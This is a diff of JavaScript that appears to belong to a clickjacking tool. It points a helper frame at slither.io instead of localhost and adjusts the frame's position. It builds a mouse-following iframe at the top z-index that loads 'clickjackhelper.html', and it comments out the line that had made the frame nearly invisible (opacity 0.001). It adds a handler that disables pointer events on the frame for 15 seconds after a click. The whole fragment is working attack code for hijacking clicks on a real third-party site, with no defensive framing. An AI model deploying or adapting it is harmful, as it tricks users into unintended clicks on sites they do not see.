@@ -2,9 +2,9 @@
                 const helperSettings = {
                         width:700,
                         height:500,
-                        top:-420,
-                        left:-293,
-                        src: 'http://localhost:8080'
+                        top:-370,
+                        left:-320,
+                        src: 'http://slither.io/'
                 }
                 const settings = {
                         width:10,
@@ -21,8 +21,15 @@
                         iframe.style.left = 0 + 'px';
                         iframe.style.position = 'absolute';
                         iframe.style.zIndex = 999999;
-                        iframe.style.opacity = 0.001;
-                        iframe.src = 'clickjackhelper.html?' + JSON.stringify(helperSettings);
+                        //iframe.style.opacity = 0.001;
+                        iframe.src = 'clickjackhelper.html?AXBC' + JSON.stringify(helperSettings);
+			iframe.addEventListener('click',(e)=>{
+				let target = e.target;
+				target.style['pointer-events'] = 'none';
+				setTimeout(()=>{
+					target.style['pointer-events'] = 'auto';
+				},1000*15);
+			});
                         document.body.appendChild(iframe);
                 });
                 window.addEventListener('mousemove',e=>{
